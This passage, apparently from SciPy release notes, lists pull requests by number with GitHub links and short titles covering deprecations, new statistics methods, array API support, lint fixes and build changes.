DEP: linalg: sharpen deprecation warning for pinv {,r}cond\n* `18814 <https://github.com/scipy/scipy/pull/18814>`__: DOC: update windows instructions and move conda/mamba\n* `18815 <https://github.com/scipy/scipy/pull/18815>`__: ENH:stats: Add _isf method to loglaplace\n* `18816 <https://github.com/scipy/scipy/pull/18816>`__: ENH:stats: Add _isf method to lognorm\n* `18817 <https://github.com/scipy/scipy/pull/18817>`__: DOC: Fix examples in randint description\n* `18818 <https://github.com/scipy/scipy/pull/18818>`__: MAINT: Simplify codespaces env activation\n* `18819 <https://github.com/scipy/scipy/pull/18819>`__: TST: stats.dgamma.pdf: adjust test that fails intermittently\n* `18820 <https://github.com/scipy/scipy/pull/18820>`__: ENH:stats: Add _isf method to pareto\n* `18822 <https://github.com/scipy/scipy/pull/18822>`__: ENH:stats: Add _sf and _isf methods to kappa3\n* `18823 <https://github.com/scipy/scipy/pull/18823>`__: ENH:stats: Add _isf method to lomax\n* `18824 <https://github.com/scipy/scipy/pull/18824>`__: ENH: override halfcauchy distribution fit\n* `18826 <https://github.com/scipy/scipy/pull/18826>`__: DEP: linalg: use _NoValue for eigh/eigvalsh positional argument...\n* `18829 <https://github.com/scipy/scipy/pull/18829>`__: ENH: optimize: vectorized minimization of univariate functions\n* `18830 <https://github.com/scipy/scipy/pull/18830>`__: DOC: soften wording on import guidelines, mention lazy loading\n* `18833 <https://github.com/scipy/scipy/pull/18833>`__: ENH: optimize: release the GIL while computing the LSAP solution\n* `18835 <https://github.com/scipy/scipy/pull/18835>`__: DEP: scipy.stats.stats: clarify deprecation warnings\n* `18840 <https://github.com/scipy/scipy/pull/18840>`__: MAINT: stats.burr12: moments are undefined when c\\*d <= order\n* `18841 <https://github.com/scipy/scipy/pull/18841>`__: MAINT: \\*sctype\\* replace NumPy 2.0\n* `18843 <https://github.com/scipy/scipy/pull/18843>`__: DEP: vendor sklearn's mechanism to deprecate passing kwargs positionally\n* `18846 <https://github.com/scipy/scipy/pull/18846>`__: MAINT: Reduce file size of the SVG files included in \\`signal.rst\\`\n* `18847 <https://github.com/scipy/scipy/pull/18847>`__: MAINT: ptp no method for NumPy 2.0\n* `18848 <https://github.com/scipy/scipy/pull/18848>`__: ENH: add compile and link args to \\`show_config\\` output\n* `18850 <https://github.com/scipy/scipy/pull/18850>`__: ENH: improve performance of \\`SphericalVoronoi\\` area calculation\n* `18852 <https://github.com/scipy/scipy/pull/18852>`__: BUG: fix overflow in stats.yeojohnson\n* `18853 <https://github.com/scipy/scipy/pull/18853>`__: BENCH: Remove factorial benchmarks\n* `18854 <https://github.com/scipy/scipy/pull/18854>`__: MAINT: signal: lighten the notation in lsim\n* `18856 <https://github.com/scipy/scipy/pull/18856>`__: MAINT: Remove more runtests.py stuff\n* `18858 <https://github.com/scipy/scipy/pull/18858>`__: MAINT: clean up views/strides/dtypes utilities in \\`cluster.hierarcy\\`\n* `18861 <https://github.com/scipy/scipy/pull/18861>`__: MAINT: avoid \\`np.deprecate\\` and \\`np.core\\`, add \\`normalize_axis_index\\`...\n* `18862 <https://github.com/scipy/scipy/pull/18862>`__: ENH: sparse arrays for hstack, vstack, bmat, block_diag. New...\n* `18863 <https://github.com/scipy/scipy/pull/18863>`__: DEP: remove extra np.deprecate and add docs back\n* `18872 <https://github.com/scipy/scipy/pull/18872>`__: DOC: Add relationship between Fisk (log-logistic) and logistic.\n* `18873 <https://github.com/scipy/scipy/pull/18873>`__: DOC: add more cross compilation details\n* `18885 <https://github.com/scipy/scipy/pull/18885>`__: DOC: minor issues in install commands\n* `18886 <https://github.com/scipy/scipy/pull/18886>`__: MAINT/DOC: remove docstring issues in ndimage\n* `18887 <https://github.com/scipy/scipy/pull/18887>`__: DOC: tab sync based on same tab name using \\`\\`sync\\`\\` statement\n* `18888 <https://github.com/scipy/scipy/pull/18888>`__: MAINT: Set RAM requirement for Codespaces\n* `18889 <https://github.com/scipy/scipy/pull/18889>`__: CI: Add prerelease build with 64bit OpenBLAS nightly\n* `18893 <https://github.com/scipy/scipy/pull/18893>`__: ENH: Geometric quality metrics for random sampling\n* `18898 <https://github.com/scipy/scipy/pull/18898>`__: DOC: fix sparse docs \"matrix\" and \"array\" mixup\n* `18905 <https://github.com/scipy/scipy/pull/18905>`__: DOC: Clarify DOF in f-distribution notes\n* `18910 <https://github.com/scipy/scipy/pull/18910>`__: DOC: from CONTRIBUTING.rst link to SciPy website\n* `18911 <https://github.com/scipy/scipy/pull/18911>`__: DOC/MAINT: \\`special\\` doc fixes\n* `18914 <https://github.com/scipy/scipy/pull/18914>`__: ENH: Enhance \\`dev.py\\` by adding command to query PYTHONPATH\n* `18916 <https://github.com/scipy/scipy/pull/18916>`__: DEP: stats: improve deprecation of private but present modules\n* `18917 <https://github.com/scipy/scipy/pull/18917>`__: ENH: move {c, q}spline_1d to use sosfilt/lfilter\n* `18920 <https://github.com/scipy/scipy/pull/18920>`__: DOC: indicate functions with multiple valid solutions in csgraph\n* `18927 <https://github.com/scipy/scipy/pull/18927>`__: TST: use Hypothesis for property-based tests\n* `18929 <https://github.com/scipy/scipy/pull/18929>`__: ENH: change sparse dok from subclass of dict to have attribute...\n* `18930 <https://github.com/scipy/scipy/pull/18930>`__: ENH: _lib._util: make _lazywhere compatible with Array API\n* `18931 <https://github.com/scipy/scipy/pull/18931>`__: MAINT: cleanup redundant tests for \\`vonmises.fit\\`\n* `18932 <https://github.com/scipy/scipy/pull/18932>`__: DEP: deprecate positional arguments for some methods in signal._fir_f\u2026\n* `18933 <https://github.com/scipy/scipy/pull/18933>`__: DEP: deprecate positional arguments for special.comb\n* `18934 <https://github.com/scipy/scipy/pull/18934>`__: DEP: deprecate positional arguments for some methods in sparse.linalg\u2026\n* `18935 <https://github.com/scipy/scipy/pull/18935>`__: DEP: deprecate positional arguments for linalg.pinv\n* `18936 <https://github.com/scipy/scipy/pull/18936>`__: DEP: deprecate positional arguments for stats.kendalltau\n* `18942 <https://github.com/scipy/scipy/pull/18942>`__: CI: Change OpenBLAS nightly wheel location\n* `18943 <https://github.com/scipy/scipy/pull/18943>`__: DEP: sparse.linalg: deprecate positional arguments for gcrotmk,...\n* `18946 <https://github.com/scipy/scipy/pull/18946>`__: DEP: linalg: deprecate positional args for eigh/eigvalsh\n* `18948 <https://github.com/scipy/scipy/pull/18948>`__: ENH: Jones and Faddy Skew-T distribution\n* `18949 <https://github.com/scipy/scipy/pull/18949>`__: DOC: stats.FitResult.plot: add example\n* `18952 <https://github.com/scipy/scipy/pull/18952>`__: MAINT: Remove \\`._is_array\\` since there's now: \\`isinstance(x,...\n* `18954 <https://github.com/scipy/scipy/pull/18954>`__: BENCH: update/rewrite lobpcg benchmark sparse_linalg_lobpcg.py\n* `18955 <https://github.com/scipy/scipy/pull/18955>`__: MAINT/DOC: spatial: Document and test the double cover property...\n* `18958 <https://github.com/scipy/scipy/pull/18958>`__: MAINT: optimize.differential_evolution: clarify that bounds must...\n* `18962 <https://github.com/scipy/scipy/pull/18962>`__: Update name of coverage action\n* `18963 <https://github.com/scipy/scipy/pull/18963>`__: ENH:sparse.linalg: Add LaplacianNd class to special sparse arrays\n* `18967 <https://github.com/scipy/scipy/pull/18967>`__: MAINT: redefine \\`PyArray_MAX\\`/\\`PyArray_MIN\\` because they...\n* `18968 <https://github.com/scipy/scipy/pull/18968>`__: DEP: optimize: improve deprecation of private modules named without...\n* `18970 <https://github.com/scipy/scipy/pull/18970>`__: DEP: integrate: improve deprecation of private modules named...\n* `18973 <https://github.com/scipy/scipy/pull/18973>`__: MAINT: linalg: remove a stray np.cast\n* `18975 <https://github.com/scipy/scipy/pull/18975>`__: ENH: Port scipy to use new numpy complex types\n* `18977 <https://github.com/scipy/scipy/pull/18977>`__: ENH: Expose c1 and c2 of scalar_search_wolfe to fmin_bfgs\n* `18986 <https://github.com/scipy/scipy/pull/18986>`__: ENH: add possibility to fix parameters in multivariate normal...\n* `18992 <https://github.com/scipy/scipy/pull/18992>`__: DEP: interpolate: improve deprecation of private modules named...\n* `18995 <https://github.com/scipy/scipy/pull/18995>`__: DOC: stats.lognorm: add example of the relationship between norm...\n* `18996 <https://github.com/scipy/scipy/pull/18996>`__: ENH: optimize.curve_fit: reduce overhead of lightweight memoization\n* `18997 <https://github.com/scipy/scipy/pull/18997>`__: DOC: add \\`noexcept\\` to \\`cython_optimize\\` docs\n* `19000 <https://github.com/scipy/scipy/pull/19000>`__: MAINT: fft: rename \\`test_numpy.py\\` to \\`test_basic.py\\`\n* `19005 <https://github.com/scipy/scipy/pull/19005>`__: ENH: fft: support array API standard\n* `19007 <https://github.com/scipy/scipy/pull/19007>`__: BLD: Add venv to .gitignore\n* `19010 <https://github.com/scipy/scipy/pull/19010>`__: DOC/MAINT: typo: change Azure reference to Cirrus\n* `19012 <https://github.com/scipy/scipy/pull/19012>`__: DOC: stats.mannwhitneyu: address apparent sign inconsistency...\n* `19013 <https://github.com/scipy/scipy/pull/19013>`__: DOCS: Fixed typo in _fitpack2.py\n* `19014 <https://github.com/scipy/scipy/pull/19014>`__: MAINT: copy, array-api compatible utility function\n* `19015 <https://github.com/scipy/scipy/pull/19015>`__: ENH: Update numpy exceptions imports\n* `19018 <https://github.com/scipy/scipy/pull/19018>`__: TST/BUG: fix array API test skip decorators\n* `19023 <https://github.com/scipy/scipy/pull/19023>`__: ENH: special: dispatch to array library\n* `19030 <https://github.com/scipy/scipy/pull/19030>`__: MAINT: replace \\`optparse\\` usage with \\`argparse\\`\n* `19033 <https://github.com/scipy/scipy/pull/19033>`__: MAINT: Fix codespaces setup.sh script\n* `19035 <https://github.com/scipy/scipy/pull/19035>`__: DEP: linalg: improve deprecation of private modules named without...\n* `19045 <https://github.com/scipy/scipy/pull/19045>`__: MAINT: Change \\`add_newdoc\\` import and remove \\`NINF\\`\n* `19047 <https://github.com/scipy/scipy/pull/19047>`__: Corrected a grammatical error in the docstring of class DOP853\n* `19050 <https://github.com/scipy/scipy/pull/19050>`__: CI/BLD: make nightly wheels daily closes #19048\n* `19051 <https://github.com/scipy/scipy/pull/19051>`__: ENH: array agnostic \\`cov\\`, used in \\`cluster\\`\n* `19052 <https://github.com/scipy/scipy/pull/19052>`__: BENCH: update asv, fail benchmark CI on errors, fix fallout\n* `19053 <https://github.com/scipy/scipy/pull/19053>`__: CI: cirrus mods\n* `19055 <https://github.com/scipy/scipy/pull/19055>`__: MAINT: use \\`copy\\` utility from #19014 in \\`cluster\\`\n* `19057 <https://github.com/scipy/scipy/pull/19057>`__: ENH: add computing a selected number m of extreme eigenpairs...\n* `19060 <https://github.com/scipy/scipy/pull/19060>`__: MAINT: port minpack2.dcsrch from Fortran to Python, remove Fortran...\n* `19061 <https://github.com/scipy/scipy/pull/19061>`__: DOC: spell NaN -> nan\n* `19062 <https://github.com/scipy/scipy/pull/19062>`__: BLD: Replace complex occurences with singlecomplex in SuperLU\n* `19064 <https://github.com/scipy/scipy/pull/19064>`__: TST: bump tolerance of \\`TestTruncexpon.test_is_isf\\` a little\n* `19066 <https://github.com/scipy/scipy/pull/19066>`__: Update dfovec.py case 20 for zero indexing\n* `19067 <https://github.com/scipy/scipy/pull/19067>`__: DEP: remove all deprecated \\`scipy.<numpy-func>\\` objects\n* `19070 <https://github.com/scipy/scipy/pull/19070>`__: DEP: odr: improved deprecation of private modules\n* `19073 <https://github.com/scipy/scipy/pull/19073>`__: DOC: remove reference to no longer imported numpy funcs\n* `19074 <https://github.com/scipy/scipy/pull/19074>`__: TST: add regression test for sqrtm unexpectedly converting to...\n* `19078 <https://github.com/scipy/scipy/pull/19078>`__: ENH: Reflect changes from numpy namespace refactor part 3\n* `19081 <https://github.com/scipy/scipy/pull/19081>`__: ENH: optimize: c1 and c2 of scalar_search_wolfe to cg and newton-cg\n* `19083 <https://github.com/scipy/scipy/pull/19083>`__: MAINT: forward port 1.11.2 relnotes\n* `19086 <https://github.com/scipy/scipy/pull/19086>`__: BLD: tweaks to build dependencies and 3.12 classifier in pyproject.toml\n* `19087 <https://github.com/scipy/scipy/pull/19087>`__: DOC: add info about usage of ccache for benchmarks\n* `19089 <https://github.com/scipy/scipy/pull/19089>`__: DOC: add comment on args in solve_ivp (#18876)\n* `19091 <https://github.com/scipy/scipy/pull/19091>`__: MAINT: optimize.root_scalar: handle args when method is newton...\n* `19093 <https://github.com/scipy/scipy/pull/19093>`__: MAINT: stats.zscore: return correct result when 0th element is...\n* `19094 <https://github.com/scipy/scipy/pull/19094>`__: BUG: optimize: update incorrect c1 value\n* `19095 <https://github.com/scipy/scipy/pull/19095>`__: ENH: optimize: add inv Hess estimate in BFGS\n* `19100 <https://github.com/scipy/scipy/pull/19100>`__: MAINT: Move \\`trapezoid\\` implementation to SciPy\n* `19104 <https://github.com/scipy/scipy/pull/19104>`__: MAINT: fix the CT subclass benchmark\n* `19110 <https://github.com/scipy/scipy/pull/19110>`__: MAINT: Remove usages of np.row_stack and np.in1d\n* `19113 <https://github.com/scipy/scipy/pull/19113>`__: MAINT, TST: default_rng few tests\n* `19115 <https://github.com/scipy/scipy/pull/19115>`__: ENH, TST: Use explicit imports in docstring examples\n* `19127 <https://github.com/scipy/scipy/pull/19127>`__: DOC: linalg: fix typos in pinv docs\n* `19128 <https://github.com/scipy/scipy/pull/19128>`__: ENH: optimize: add method attribute to result object from root_scalar...\n* `19129 <https://github.com/scipy/scipy/pull/19129>`__: DOC:Added Examples To \\`combine_pvalues\\` and \\`fhtoffset\\`\n* `19136 <https://github.com/scipy/scipy/pull/19136>`__: MAINT: remove NumPy infty alias\n* `19141 <https://github.com/scipy/scipy/pull/19141>`__: MAINT: more NumPy API shims\n* `19143 <https://github.com/scipy/scipy/pull/19143>`__: MAINT: remove asfarray usage\n* `19146 <https://github.com/scipy/scipy/pull/19146>`__: DOC: sparse.linalg: Enhance lobpcg documentation with updated...\n* `19152 <https://github.com/scipy/scipy/pull/19152>`__: DOC: fix predeces(s)or typo.\n* `19157 <https://github.com/scipy/scipy/pull/19157>`__: TST: add array-agnostic assertions\n* `19162 <https://github.com/scipy/scipy/pull/19162>`__: ENH: Allow \\`sparse_mtx.transpose(axes=(1, 0))\\`\n* `19165 <https://github.com/scipy/scipy/pull/19165>`__: DEP: improve deprecation warnings for constants module\n* `19166 <https://github.com/scipy/scipy/pull/19166>`__: MAINT: Reflect changes from \\`numpy\\` namespace refactor Part...\n* `19168 <https://github.com/scipy/scipy/pull/19168>`__: BLD: special: fix dependencies for \\`_ellip_harm_2\\`\n* `19170 <https://github.com/scipy/scipy/pull/19170>`__: MAINT: fix a number of issues in Cython code\n* `19171 <https://github.com/scipy/scipy/pull/19171>`__: ENH: constructors for sparse arrays\n* `19172 <https://github.com/scipy/scipy/pull/19172>`__: MAINT: Spherical Voronoi sort simplify\n* `19173 <https://github.com/scipy/scipy/pull/19173>`__: MAINT: integrate._tanhsinh: improvements after further testing\n* `19175 <https://github.com/scipy/scipy/pull/19175>`__: DOC: stats: Correct levy_stable loc-scale note\n* `19178 <https://github.com/scipy/scipy/pull/19178>`__: MAINT/DOC: add \\`fit\\` to multivariate normal methods in documentation\n* `19179 <https://github.com/scipy/scipy/pull/19179>`__: DOC: Added example for tf2zpk function\n* `19183 <https://github.com/scipy/scipy/pull/19183>`__: MAINT: Import \\`fromarrays\\` from \\`rec\\`\n* `19184 <https://github.com/scipy/scipy/pull/19184>`__: TST: fix sparse constructor test with large memory footprint\n* `19186 <https://github.com/scipy/scipy/pull/19186>`__: TST: _lib: improve array API assertions\n* `19187 <https://github.com/scipy/scipy/pull/19187>`__: BUG: accept \\`np\\`-coercible array-likes with array API flag...\n* `19191 <https://github.com/scipy/scipy/pull/19191>`__: BLD: update minimum versions of meson-python and pythran\n* `19192 <https://github.com/scipy/scipy/pull/19192>`__: TST: test tolerance bumps to fix reported failures\n* `19194 <https://github.com/scipy/scipy/pull/19194>`__: BUG/TST: fix \\`test_array_api\\` for \\`cupy\\`\n* `19195 <https://github.com/scipy/scipy/pull/19195>`__: DOC: Fixed typo in scipy.stats.Covariance\n* `19198 <https://github.com/scipy/scipy/pull/19198>`__: DOC: optimize.minimize_scalar: note limitations and suggest alternatives\n* `19201 <https://github.com/scipy/scipy/pull/19201>`__: DOC: missing backticks\n* `19202 <https://github.com/scipy/scipy/pull/19202>`__: DOC: remove old mention to Python 2.\n* `19203 <https://github.com/scipy/scipy/pull/19203>`__: DOC: Fix _nan_allsame example prompt.\n* `19204 <https://github.com/scipy/scipy/pull/19204>`__: DOC: missing (and stray) backtick in mannwhitneyu\n* `19206 <https://github.com/scipy/scipy/pull/19206>`__: TST, MAINT: skip fix for array API tests\n* `19217 <https://github.com/scipy/scipy/pull/19217>`__: BLD: start building wheels against numpy 2.0 [wheel build]\n* `19218 <https://github.com/scipy/scipy/pull/19218>`__: DOC: Added examples for zpk2tf, tf2sos, sos2tf, lp2lp_zpk, lp2hp_zpk,...\n* `19219 <https://github.com/scipy/scipy/pull/19219>`__: ENH: Implemented custom mutation / crossover functions for DifferentialEvolution\n* `19222 <https://github.com/scipy/scipy/pull/19222>`__: DOC: clarify guidance on style modifications\n* `19224 <https://github.com/scipy/scipy/pull/19224>`__: BUG: integrate: expose ODEintWarning\n* `19226 <https://github.com/scipy/scipy/pull/19226>`__: DEP: improve message for deprecated private API for \\`sparse\\`\n* `19227 <https://github.com/scipy/scipy/pull/19227>`__: DOC: Trailing character after closing backquote.\n* `19229 <https://github.com/scipy/scipy/pull/19229>`__: DOC: Fix repeated typos in dev.py\n* `19233 <https://github.com/scipy/scipy/pull/19233>`__: DOC: Fix character after trailing backticks\n* `19236 <https://github.com/scipy/scipy/pull/19236>`__: BUG: Remove removed item from \\`__all__\\`\n* `19237 <https://github.com/scipy/scipy/pull/19237>`__: DOC: Missing import in private _nan_allsame function docs.\n* `19240 <https://github.com/scipy/scipy/pull/19240>`__: DEP: spatial: improve deprecation of private modules without...\n* `19243 <https://github.com/scipy/scipy/pull/19243>`__: DOC: stats: fix documentation of warnings raised by pearsonr\n* `19244 <https://github.com/scipy/scipy/pull/19244>`__: MAINT: scipy.io NEP 50 shims\n* `19247 <https://github.com/scipy/scipy/pull/19247>`__: MAINT: NumPy version check removals\n* `19251 <https://github.com/scipy/scipy/pull/19251>`__: TST/MAINT: cluster: use new array API assertions\n* `19253 <https://github.com/scipy/scipy/pull/19253>`__: MAINT: Cleanup expired ndarray methods\n* `19256 <https://github.com/scipy/scipy/pull/19256>`__: DOC: Added examples for correlation, num_obs_dm, num_obs_y functions.\n* `19259 <https://github.com/scipy/scipy/pull/19259>`__: DOC: outline workaround when precision losses occur in BFGS [skip...\n* `19261 <https://github.com/scipy/scipy/pull/19261>`__: MAINT: fft: refactor basic backend with \\`_execute_1D\\`\n* `19262 <https://github.com/scipy/scipy/pull/19262>`__: MAINT: fft: clean up test-skips\n* `19263 <https://github.com/scipy/scipy/pull/19263>`__: ENH: fft: GPU support for non-standard basic transforms\n* `19264 <https://github.com/scipy/scipy/pull/19264>`__: MAINT/TST: fft: remove duplicate namespace and dtype checks\n* `19265 <https://github.com/scipy/scipy/pull/19265>`__: MAINT: array API: rename \\`arg_err_msg\\` and move to \\`_lib\\`\n* `19266 <https://github.com/scipy/scipy/pull/19266>`__: ENH: use inplace add in _minimize_newtoncg\n* `19267 <https://github.com/scipy/scipy/pull/19267>`__: MAINT: use linalg.norm in \\`_minimize_newtoncg\\`\n* `19270 <https://github.com/scipy/scipy/pull/19270>`__: MAINT: fix -Wdeprecated-non-prototype warnings in Cephes code\n* `19271 <https://github.com/scipy/scipy/pull/19271>`__: DOC: add example for \\`ndimage.shift\\`\n* `19275 <https://github.com/scipy/scipy/pull/19275>`__: MAINT: Add warning filter for \\`numpy.core\\` rename\n* `19278 <https://github.com/scipy/scipy/pull/19278>`__: DOC: use \\`np.copysign()\\` instead of \\`np.sign()\\`\n* `19281 <https://github.com/scipy/scipy/pull/19281>`__: DOC: add \\`fft\\` to list of array API supporting modules\n* `19282 <https://github.com/scipy/scipy/pull/19282>`__: MAINT: fft: clean up assertions\n* `19284 <https://github.com/scipy/scipy/pull/19284>`__: ENH: update SuperLU to version 6.0.1\n* `19285 <https://github.com/scipy/scipy/pull/19285>`__: MAINT fix more \\`-Wdeprecate-non-prototype\\` warnings\n* `19287 <https://github.com/scipy/scipy/pull/19287>`__: ENH: add exact=False support for stirling2\n* `19289 <https://github.com/scipy/scipy/pull/19289>`__: BLD: stats: improve build config for \\`unuran_wrapper\\`\n* `19293 <https://github.com/scipy/scipy/pull/19293>`__: MAINT: optimize._bracket_root: refactor and comment for clarity\n* `19294 <https://github.com/scipy/scipy/pull/19294>`__: MAINT: replace IOError alias with OSError\n* `19295 <https://github.com/scipy/scipy/pull/19295>`__: DOC: fix typos found by codespell\n* `19296 <https://github.com/scipy/scipy/pull/19296>`__: MAINT: fix linter issues\n* `19298 <https://github.com/scipy/scipy/pull/19298>`__: MAINT: replace io.open alias with built-in open\n* `19302 <https://github.com/scipy/scipy/pull/19302>`__: MAINT: Fix/parametrize Rotation tests.\n* `19304 <https://github.com/scipy/scipy/pull/19304>`__: DOC: fix page typo in ks_2samp reference\n* `19310 <https://github.com/scipy/scipy/pull/19310>`__: MAINT: Remove \\`np.int_\\` and \\`np.uint\\`\n* `19311 <https://github.com/scipy/scipy/pull/19311>`__: DOC: invalid interpreted-text (missing space after closing backtick).\n* `19312 <https://github.com/scipy/scipy/pull/19312>`__: DOC: Misc formatting error.\n* `19313 <https://github.com/scipy/scipy/pull/19313>`__: DOC: And new line at end of line in CPP code.\n* `19314 <https://github.com/scipy/scipy/pull/19314>`__: DOC: Rst don't like list without blanklines.\n* `19315 <https://github.com/scipy/scipy/pull/19315>`__: MAINT: forward port 1.11.3 relnotes\n* `19317 <https://github.com/scipy/scipy/pull/19317>`__: MAINT: remove support for building with setup.py\n* `19327 <https://github.com/scipy/scipy/pull/19327>`__: ENH: Add a numerically stable logpdf function for the skewnorm...\n* `19331 <https://github.com/scipy/scipy/pull/19331>`__: MAINT, BLD: more setup.py cleanups\n* `19333 <https://github.com/scipy/scipy/pull/19333>`__: ENH: Fit skewnorms with MLE more robustly\n* `19340 <https://github.com/scipy/scipy/pull/19340>`__: DEP: deprecate scipy.signal wavelets\n* `19341 <https://github.com/scipy/scipy/pull/19341>`__: MAINT: Remove remaining \\`numpy.int_\\` and filter \\`np.long\\`...\n* `19346 <https://github.com/scipy/scipy/pull/19346>`__: MAINT: stats: fix \\`differential_entropy\\` too small error behavior\n* `19347 <https://github.com/scipy/scipy/pull/19347>`__: BUG: fix ValueError in stats.truncpareto\n* `19349 <https://github.com/scipy/scipy/pull/19349>`__: MAINT: Minor fix to shim import of scipy.signal.\n* `19350 <https://github.com/scipy/scipy/pull/19350>`__: ENH: stats: add support for masked arrays, \\`nan_policy\\`, and...\n* `19358 <https://github.com/scipy/scipy/pull/19358>`__: TST: SphericalVoronoi region type\n* `19360 <https://github.com/scipy/scipy/pull/19360>`__: BLD, MAINT: more build system cleanups\n* `19367 <https://github.com/scipy/scipy/pull/19367>`__: CI: avoid using Cython 3.0.3\n* `19371 <https://github.com/scipy/scipy/pull/19371>`__: ENH: stats.ansari: add axis / nan_policy / keepdims support\n* `19376 <https://github.com/scipy/scipy/pull/19376>`__: TST: bump tolerance of \\`test_al_mohy_higham_2012_experiment_1\\`\n* `19380 <https://github.com/scipy/scipy/pull/19380>`__: DEV/CI: use scipy-openblas32 wheels in dev.py and some CI jobs\n* `19385 <https://github.com/scipy/scipy/pull/19385>`__: ENH: beta negative binomial distribution\n* `19390 <https://github.com/scipy/scipy/pull/19390>`__: DOC, MAINT: more distutils/build cleanups\n* `19391 <https://github.com/scipy/scipy/pull/19391>`__: MAINT: spatial: Change error message in KDTree to be more informative.\n* `19392 <https://github.com/scipy/scipy/pull/19392>`__: ENH: stats.bartlett: add axis / nan_policy / keepdims support\n* `19394 <https://github.com/scipy/scipy/pull/19394>`__: MAINT: Partially revert \\`np.int_\\` changes\n* `19395 <https://github.com/scipy/scipy/pull/19395>`__: DEP: ndimage: improve the deprecation of private modules named...\n* `19399 <https://github.com/scipy/scipy/pull/19399>`__: TST: signal: add missing assertion in test_filter_design.py\n* `19402 <https://github.com/scipy/scipy/pull/19402>`__: MAINT: l-bfgs-b remove intermediate bounds array\n* `19409 <https://github.com/scipy/scipy/pull/19409>`__: MAINT: fix a C++ build error with GCC 13\n* `19410 <https://github.com/scipy/scipy/pull/19410>`__: DOC: interpolate: add note to BarycentricInterpolator.add_xi\n* `19412 <https://github.com/scipy/scipy/pull/19412>`__: ENH: stats: add support for masked arrays for circular statistics...\n* `19414 <https://github.com/scipy/scipy/pull/19414>`__: BLD: with-scipy-openblas instead of use-scipy-openblas\n* `19419 <https://github.com/scipy/scipy/pull/19419>`__: ENH: SphericalVoronoi sort faster\n* `19422 <https://github.com/scipy/scipy/pull/19422>`__: DOC: Fix trivial typo.\n* `19425 <https://github.com/scipy/scipy/pull/19425>`__: ENH: stats: add masked array, axis tuple, and nan policy support...\n* `19426 <https://github.com/scipy/scipy/pull/19426>`__: MAINT: Update \\`fft.helper\\` import\n* `19428 <https://github.com/scipy/scipy/pull/19428>`__: ENH: stats.levene/fligner: add axis / nan_policy / keepdims support\n* `19429 <https://github.com/scipy/scipy/pull/19429>`__: DOC: Fix documentation of callback function signature of scipy.optimize.minimize\n* `19431 <https://github.com/scipy/scipy/pull/19431>`__: MAINT: more NEP 50 shims\n* `19433 <https://github.com/scipy/scipy/pull/19433>`__: DOC: Add example for \\`stats.hdquantiles\\`\n* `19435 <https://github.com/scipy/scipy/pull/19435>`__: MAINT: Translate lambertw_scalar into C++\n* `19439 <https://github.com/scipy/scipy/pull/19439>`__: BLD: update build dependency versions in pyproject.toml\n* `19440 <https://github.com/scipy/scipy/pull/19440>`__: DOC: remove unused parameter in spline_filter docstring\n* `19443 <https://github.com/scipy/scipy/pull/19443>`__: TST: Fix #19442 minimally\n* `19445 <https://github.com/scipy/scipy/pull/19445>`__: TST: Remove some unnecessary tuple conversions\n* `19449 <https://github.com/scipy/scipy/pull/19449>`__: DOC/MAINT: fft: fix signature for next_fast_len\n* `19453 <https://github.com/scipy/scipy/pull/19453>`__: Added parenthesis for accurate calculation of frequencies w when...\n* `19458 <https://github.com/scipy/scipy/pull/19458>`__: DOC: spatial: Rotation docs updates\n* `19461 <https://github.com/scipy/scipy/pull/19461>`__: DOC: dev: update max line length to 88 characters\n* `19465 <https://github.com/scipy/scipy/pull/19465>`__: DOC: fix broken NetCDF URL\n* `19466 <https://github.com/scipy/scipy/pull/19466>`__: MAINT: NumPy int type shims\n* `19469 <https://github.com/scipy/scipy/pull/19469>`__: DEP: special: improve deprecation of private modules named without...\n* `19471 <https://github.com/scipy/scipy/pull/19471>`__: MAINT: Translate binom to C++\n* `19472 <https://github.com/scipy/scipy/pull/19472>`__: MAINT: Update fast_matrix_market to 1.7.4\n* `19482 <https://github.com/scipy/scipy/pull/19482>`__: MAINT: Make use of sf_error conditional on flag in scipy::special...\n* `19483 <https://github.com/scipy/scipy/pull/19483>`__: ENH: add max dist to NearestNDInterpolator\n* `19484 <https://github.com/scipy/scipy/pull/19484>`__: CI: limit scipy-openblas32 wheel to 0.3.23.293.2\n* `19487 <https://github.com/scipy/scipy/pull/19487>`__: ENH: stats.cramervonmises/epps_singleton: add axis / nan_policy...\n* `19489 <https://github.com/scipy/scipy/pull/19489>`__: MAINT: lint: ignore E501 (line length) by subpackage\n* `19491 <https://github.com/scipy/scipy/pull/19491>`__: MAINT/STY: misc: remove E501 (line length) lint ignore\n* `19494 <https://github.com/scipy/scipy/pull/19494>`__: MAINT/STY: \\`conftest.py\\`: remove E501 (line length) lint ignore\n* `19495 <https://github.com/scipy/scipy/pull/19495>`__: MAINT: get rid of Python 2 left-overs\n* `19497 <https://github.com/scipy/scipy/pull/19497>`__: CI: add '[lint only]', '[docs only]' skip tags\n* `19501 <https://github.com/scipy/scipy/pull/19501>`__: TST: skip test_bootstrap_against_theory\n* `19503 <https://github.com/scipy/scipy/pull/19503>`__: MAINT/STY: fftpack: remove E501 (line length) lint ignore\n* `19505 <https://github.com/scipy/scipy/pull/19505>`__: MAINT/STY: \\`scipyoptdoc.py\\`: remove E501 (line length) lint...\n* `19506 <https://github.com/scipy/scipy/pull/19506>`__: MAINT: sparse: update tests to switch to format and toarray from...\n* `19507 <https://github.com/scipy/scipy/pull/19507>`__: MAINT/DOC: stats: fix lint errors\n* `19508 <https://github.com/scipy/scipy/pull/19508>`__: MAINT/DOC/BENCH: optimize: fix linter errors\n* `19509 <https://github.com/scipy/scipy/pull/19509>`__: MAINT: fix remaining lint errors\n* `19510 <https://github.com/scipy/scipy/pull/19510>`__: DEP: integrate: deprecate romberg and quadrature\n* `19514 <https://github.com/scipy/scipy/pull/19514>`__: MAINT/STY: odr: remove E501 (line length) lint ignore\n* `19515 <https://github.com/scipy/scipy/pull/19515>`__: MAINT: Restructure extra_special (working name) as internal library\n* `19516 <https://github.com/scipy/scipy/pull/19516>`__: MAINT: lint: enable UP rules\n* `19519 <https://github.com/scipy/scipy/pull/19519>`__: DOC: Fix example used in stats tutorial\n* `19520 <https://github.com/scipy/scipy/pull/19520>`__: MAINT/STY: fft: remove E501 (line length) lint ignore, \\`noqa\\`...\n* `19523 <https://github.com/scipy/scipy/pull/19523>`__: MAINT/STY: constants: remove E501 (line length) lint ignore\n* `19525 <https://github.com/scipy/scipy/pull/19525>`__: DOC, CI: refguide may vary locs\n* `19527 <https://github.com/scipy/scipy/pull/19527>`__: DOC, MAINT: more refguide fixes\n* `19529 <https://github.com/scipy/scipy/pull/19529>`__: MAINT: blanket \\`noqa\\` vet\n* `19533 <https://github.com/scipy/scipy/pull/19533>`__: DOC: fix more typos found by codespell\n* `19534 